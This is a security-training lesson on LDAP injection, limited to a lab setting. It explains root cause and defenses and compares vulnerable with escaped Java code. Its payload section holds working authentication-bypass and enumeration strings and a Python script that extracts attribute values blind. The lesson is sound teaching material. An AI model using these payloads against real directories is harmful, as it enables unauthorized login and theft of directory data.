---
schema_version: 1
id: WEB-A05-LDAP-INJECTION
title: "LDAP Injection"
slug: ldap-injection
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  - A05:2025
cwe:
  - CWE-90
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# LDAP Injection

> [!CAUTION]
> Only practice on systems you own or are explicitly authorized. Use synthetic data, disposable fixtures, and limit resources; do not send payloads to the Internet or real targets.

## 1. Learning Objectives

After this lesson, you can:

- Explain LDAP Injection by root cause instead of just describing the consequences. 
- Identify the trust boundary, asset, actor, and necessary conditions for the vulnerability to be exploited. 
- Conduct controlled testing in a local lab and distinguish expected results from false positives. 
- Select root controls, implement the fix, and retest using positive, negative, and boundary cases.

## 2. Prerequisites

- Grasp the flow of HTTP request/response in the situation of LDAP Injection and how to apply input handling across trust boundaries. 
- Distinguish between authentication, authorization, and validation. 
- Be able to read code/configuration in the language or framework appearing in the example. 
- Have an isolated local lab, synthetic data, observable logs, and clear testing permissions.

## 3. Background Knowledge

Imagine LDAP as a giant directory book of a large corporation, where all information about employees, departments, computers, and their access rights is stored. To search for information in this book, the system uses search filters with special logical characters like `&` (and), `|` (or), or `*` (representing any character). Typically, when an employee logs in, the application will use this filter to match the username and password to see if they correspond with the data in the directory.

```
# LDAP Filter Syntax - Basic operations
(attribute=value)           # Equality match
(attribute=val*)            # Substring/wildcard match
(&(filter1)(filter2))       # AND - both must match
(|(filter1)(filter2))       # OR - either can match
(!(filter))                 # NOT - negation
(attribute>=value)          # Greater or equal
(attribute<=value)          # Less or equal
(attribute=*)               # Presence - attribute exists
```

```java
// Normal LDAP authentication in Java
import javax.naming.directory.*;

public boolean authenticate(String username, String password) {
    // Build LDAP search filter to find the user
    String filter = "(&(uid=" + username + ")(objectClass=person))";

    // Search in the directory
    SearchControls controls = new SearchControls();
    controls.setSearchScope(SearchControls.SUBTREE_SCOPE);

    NamingEnumeration<?> results = ctx.search(
        "dc=company,dc=com",  // Base DN (Distinguished Name)
        filter,                // Search filter
        controls
    );

    if (results.hasMore()) {
        // Attempt to bind (authenticate) with the found DN and password
        String userDN = results.next().getNameInNamespace();
        return ldapBind(userDN, password);  // Verify password via LDAP bind
    }
    return false;
}
```
Directory Information Tree (DIT) has a hierarchical structure: `dc=company,dc=com` → `ou=People` → `cn=John Doe`. Each entry has attributes such as `uid`, `cn`, `mail`, `userPassword`, `memberOf`.

## 4. Description and Root Cause

The LDAP Injection vulnerability occurs when a web application directly concatenates a username entered by the user into an LDAP query statement without sanitizing special characters. An attacker can input strange usernames containing characters like `*` or parentheses to completely change the meaning of the original search statement. For example, instead of correctly checking the password, the statement is transformed into "search for anyone named admin without caring about the password." As a result, malicious actors can log in to other people's accounts without authorization, gain unauthorized access to sensitive personnel data in the system, or leak the entire internal contact list of the enterprise.

> **Reference:** Technical claims in the lesson are marked with source markers; when applying in practice, refer to the version/framework being used: [S1], [S2], [S3], [S4], [S5].

## 5. Threat Model and Exploitation Conditions

- **Assets:** directory entry and the result of authentication/search. 
- **Actor, authentication, and role:** anonymous calls login/search; no directory role. 
- **Exploitation conditions:** unescaped input is concatenated into LDAP filter and changes the predicate tree. 
- **Browser, proxy, framework, and version:** OpenLDAP 2.6 and Python 3.12 ldap3 on loopback; no browser needed; must record actual image/package version along with evidence. 
- **Required evidence:** with correlation ID, input must be concatenated, decision control and impact on the correct asset; individual status code is insufficient. [S1]

## 6. Attack Mechanism

For ldap injection, unescaped input is concatenated into the LDAP filter and changes the predicate tree. A positive case must demonstrate that the input reaches the correct sink and produces the described effect; a negative case, when the original control is enabled, must be blocked before any side effect. The conclusion only applies to the environment pinned in item 5. [S1]

## 7. Testing in an Authorized Lab

1. **Setup:** launch OpenLDAP 2.6 and Python 3.12 ldap3 on loopback; no browser needed; only load synthetic data, enable application/proxy/datastore logs, and attach correlation ID.
2. **Baseline:** send a valid input for the ldap injection use case; record raw request/response, determine policy and asset state before the test.
3. **Input and operations:** use exactly one core payload from item 8 in the annotated context; change one variable at a time and comply with the request cap.
4. **Expected result:** only consider a vulnerable fixture as positive when logs prove that the “unescaped input is concatenated into the LDAP filter and modifies the predicate tree”; secure fixtures must block before side effects, and boundary input must fail closed.
5. **Cleanup:** delete ldap injection data, marker, and logs; revoke related session/cache, revert snapshot, and confirm no test callbacks/processes remain.
6. **Safety limits:** run only on loopback/`.lab.test`; do not use target, credentials, or real data; OOB/DoS/state-changing must have network/CPU/memory/request cap.

## 8. Payloads and Scope of Applicability

The blocks below are minimal lab examples according to the context recorded in the annotation. Before use, check the framework/version, encoding, expected result, and risk; only run in an authorized local fixture. Extended payload belongs to `security_cheatsheet.md`; lessons only retain the core examples.

### 1. Authentication Bypass

<!-- payload-id: WEB-A05-LDAP-INJECTION-001 -->
<!-- context: OpenLDAP 2.6 login fixture concatenates username/password into an RFC 4515 filter -->
<!-- prerequisites: directory contains only fixture-user entries; one request; anonymous bind limited to lab subtree -->
<!-- encoding: asterisk is sent as literal UTF-8 form data and reaches the filter unescaped -->
<!-- expected-result: vulnerable filter matches the designated fixture entry; escaped filter treats * literally and returns no login -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
# Original filter built by application:
(&(uid=USERNAME)(userPassword=PASSWORD))

# Attack: inject wildcard into username field
Username: *
Password: *

# Resulting filter:
(&(uid=*)(userPassword=*))
# Matches ANY user with ANY password → returns first user (usually admin)
```

<!-- payload-id: WEB-A05-LDAP-INJECTION-002 -->
<!-- context: OpenLDAP 2.6 filter string with username inserted inside an AND expression -->
<!-- prerequisites: synthetic fixture-admin entry whose DN is uid=fixture-admin,ou=People,dc=lab,dc=test; one request; no production directory or privileged bind -->
<!-- encoding: parentheses and asterisk are literal UTF-8 input; HTTP form layer percent-encodes them once -->
<!-- expected-result: vulnerable parsed filter differs from baseline and matches fixture-admin; filter builder rejects/escapes input -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
# Attack: Close the filter early and add always-true condition
Username: fixture-admin)(|(uid=*
Password: anything

# Resulting filter:
(&(uid=fixture-admin)(|(uid=*)(userPassword=anything)))
# The OR condition (uid=*) is always true → bypasses password check
```

### 2. Data Extraction via Blind LDAP Injection

<!-- payload-id: WEB-A05-LDAP-INJECTION-003 -->
<!-- context: Python 3.12; loopback-only LDAP fixture with synthetic mail attribute -->
<!-- prerequisites: fixture bound to loopback; maximum 32 characters and 1,280 requests -->
<!-- encoding: requests form-encodes UTF-8 username patterns; LDAP metacharacters are intentionally unescaped only in vulnerable fixture -->
<!-- expected-result: recover at most 32 characters from the fixture attribute, then stop -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```python
# Extract attribute values character by character using wildcards
import requests
import string

url = "http://127.0.0.1:8080/login"
charset = string.ascii_lowercase + string.digits + "@._-"
max_length = 32
max_requests = max_length * len(charset)
request_count = 0

# Extract the public fixture user's lab mail marker
extracted = ""
for _ in range(max_length):
    found = False
    for c in charset:
        if request_count >= max_requests:
            break
        request_count += 1
        # Inject into username field to probe mail attribute
        payload = f"fixture-admin)(mail={extracted}{c}*"
        r = requests.post(url, data={
            "username": payload,
            "password": "anything)(|(uid=*"
        })
        if "Welcome" in r.text:  # Successful login indicates match
            extracted += c
            print(f"Found: {extracted}")
            found = True
            break
    if not found or request_count >= max_requests:
        break

print(f"Fixture mail marker: {extracted}")
```

### 3. Directory Enumeration

<!-- payload-id: WEB-A05-LDAP-INJECTION-004 -->
<!-- context: bounded prefix and group-membership probes against the synthetic OpenLDAP subtree -->
<!-- prerequisites: fixture usernames/groups only; maximum 16 prefix cases and one group case; no privileged bind -->
<!-- encoding: RFC 4515 metacharacters are form-encoded once; DN is cn=Lab Admins,ou=Groups,dc=lab,dc=test -->
<!-- expected-result: response difference reveals only the documented fixture username/group; escaped filter returns no wildcard match -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
# Enumerate valid usernames using wildcard injection
Username: a*        → 200 OK (users starting with 'a' exist)
Username: fixture-*       → 200 OK
Username: fixture-admin*  → 200 OK
Username: fixture-adminx* → 401 Fail
# Confirmed synthetic username: fixture-admin

# Enumerate group membership
Username: *)(memberOf=cn=Lab Admins,ou=Groups,dc=lab,dc=test
# Filter uses only the documented Lab Admins DN in the synthetic subtree.
```

### 4. OR-based Injection to Dump Users

<!-- payload-id: WEB-A05-LDAP-INJECTION-005 -->
<!-- context: OpenLDAP 2.6 login filter receives an injected OR/objectClass branch -->
<!-- prerequisites: directory contains three public fixture entries; one request; result count is logged but records are not returned -->
<!-- encoding: parentheses and asterisk are UTF-8 form data, percent-encoded once by the client -->
<!-- expected-result: vulnerable query count becomes three; fixed filter builder treats the input literally and returns zero -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
# Inject OR condition to return multiple entries
Username: *)(|(objectClass=*
Password: anything

# Resulting filter:
(&(uid=*)(|(objectClass=*)(userPassword=anything)))
# Returns ALL entries in the directory tree
```

## 9. Vulnerable Code and Secure Code

```java
// ❌ VULNERABLE: String concatenation in LDAP filter
public boolean login(String username, String password) {
    // User input directly concatenated into filter - LDAP injection!
    String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";

    NamingEnumeration<?> results = ctx.search(
        "ou=People,dc=company,dc=com", filter, controls
    );
    return results.hasMore();
}
```

```java
// ✅ SECURE: Escaped input + bind authentication
public boolean login(String username, String password) {
    // Step 1: Sanitize input - escape LDAP special characters
    String safeUsername = escapeLdapFilter(username);

    // Step 2: Validate format - only alphanumeric and limited chars
    if (!safeUsername.matches("[a-zA-Z0-9._-]{1,64}")) {
        return false;
    }

    // Step 3: Search for user DN only (no password in filter)
    String filter = "(uid=" + safeUsername + ")";
    NamingEnumeration<?> results = ctx.search(
        "ou=People,dc=company,dc=com", filter, controls
    );

    if (!results.hasMore()) return false;

    // Step 4: Authenticate via LDAP bind (server validates password)
    String userDN = results.next().getNameInNamespace();
    try {
        Hashtable<String, String> bindEnv = new Hashtable<>();
        bindEnv.put(Context.SECURITY_PRINCIPAL, userDN);
        bindEnv.put(Context.SECURITY_CREDENTIALS, password);
        new InitialDirContext(bindEnv);  // Bind succeeds = valid password
        return true;
    } catch (AuthenticationException e) {
        return false;  // Invalid password
    }
}

// LDAP special character escaping per RFC 4515
public static String escapeLdapFilter(String input) {
    StringBuilder sb = new StringBuilder();
    for (char c : input.toCharArray()) {
        switch (c) {
            case '\\': sb.append("\\5c"); break;
            case '*':  sb.append("\\2a"); break;
            case '(':  sb.append("\\28"); break;
            case ')':  sb.append("\\29"); break;
            case '\0': sb.append("\\00"); break;
            default:   sb.append(c);
        }
    }
    return sb.toString();
}
```

## 10. Detection

- Log the actor/session, route or operation, object/resource related to LDAP Injection, the policy result, and correlation ID; do not log secrets or full tokens.
- Compare authorization/validation failures with the valid baseline and alert according to the behavior chain, not just one payload chain.
- Combine application telemetry, reverse proxy, and datastore to confirm that the request reached the sink and whether it had any impact.
- Scanner or WAF alert is only an investigation signal; it is not the sole proof that a vulnerability exists. [S1]

## 11. Defense

### Compulsory control

- Escape according to RFC 4515 or use the filter builder with fixed attributes; do not concatenate filter strings.
- Apply the same control to all routes, operations, and equivalent processing paths; failure must stop before side effects.

### Defense-in-depth

With LDAP Injection, the following measures help reduce blast radius or increase detection capability. Rate limit, UUID unpredictability, WAF, CSP, or general validation should not be used as a substitute for original controls.

- **Summary**: Encode special characters in the LDAP filter and use parameterized query statements. 
- **Detailed steps**:
  - Escape LDAP special characters: Replace `*`, `(`, `)`, `\`, `NUL` with the escaped form (`\2a`, `\28`, `\29`, `\5c`, `\00`).
  - Use parameterized LDAP queries: Use framework LDAP API with bind parameters.
  - Input validation: Apply identity policy to username and escape according to RFC 4515 if the username enters the filter; do not restrict the password character set to prevent injection, because the password must be passed as LDAP bind credential rather than concatenated into the filter.
  - Bind authentication: Authenticate using LDAP bind instead of comparing the password in the filter.
  - Least privilege: LDAP service account should only have read access to the necessary attributes.
  - Rate limiting and account lockout: Prevent automated enumeration attacks.

## 12. Retest

- **Positive case:** with LDAP Injection, the valid flow still works correctly for the actor and allowed data.  
- **Negative case:** the same input/resource but with an actor or context not allowed should be denied without leaking sensitive details.  
- **Boundary case:** test empty values, edge cases, different encodings, repeated requests, expired session state, and equivalent paths/operations.  
- **Telemetry:** verify that policy decisions, application logs, proxy logs, and datastore side effects match the correlation ID.  
- **Recheck:** save the minimal scenario that reproduces the old error and prove that the fix does not depend on WAF/rate limit.

## 13. Common Mistakes

- Only check the status code or response string of LDAP Injection without confirming side effects and logs. 
- Use a payload with correct syntax but the wrong DBMS, browser, framework, protocol, or injection context. 
- Consider UUID, rate limit, WAF, CSP, or general input validation as fixed by another original control. 
- Only fix one route while the same sink/policy is used in another route. 
- Conclude that a vulnerability exists without saving the source, fixture version, and observable evidence.

## 14. Summary and Checklist

- [ ] Root cause, consequences, and exploitation techniques have been separated.  
- [ ] Actor, role/authentication, trust boundary, technology, and version are clear.  
- [ ] Payload has a unique ID, context, encoding, conditions, expected result, risk, validation, and source.  
- [ ] Code prone to errors/unsafe uses the same framework, version, and use case.  
- [ ] Mandatory controls cannot be replaced with defense-in-depth.  
- [ ] Positive, negative, boundary cases, and telemetry have been retested.  
- [ ] Sensitive technical claims have references in section 17, and all links are only in sections 16–17.  
- [ ] Cleanup completed; no secrets, real targets, Internet callbacks, or customer data remain.

## 15. Glossary

- **LDAP**: Lightweight directory access protocol used to manage employee information and enterprise resources.
- **LDAP Injection**: Illegally inserting LDAP statements to alter the directory search logic.
- **Search Filter**: A string of characters defining search rules in the LDAP database.
- **Wildcard**: A placeholder character (usually `*`) that matches any string of characters.
- **DN (Distinguished Name)**: A unique name representing a record in the LDAP tree structure.

## 16. Related Lessons and Further Reading

- [SQL Injection](../sql-injection/) — Database query statement injection vulnerability.

## 17. References

- **[S1]** OWASP WSTG – LDAP Injection. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection — version/status: current version; access: 2026-07-17.
- **[S2]** HackTricks – LDAP Injection. https://book.hacktricks.wiki/en/pentesting-web/ldap-injection.html — version/status: current version; access: 2026-07-17.
- **[S3]** CWE-90. https://cwe.mitre.org/data/definitions/90.html — version/status: current version; access: 2026-07-17.
- **[S4]** RFC 4515 – LDAP Search Filters. https://datatracker.ietf.org/doc/html/rfc4515 — version/status: current version; access: 2026-07-17.
- **[S5]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — version/status: current version; access: 2026-07-17.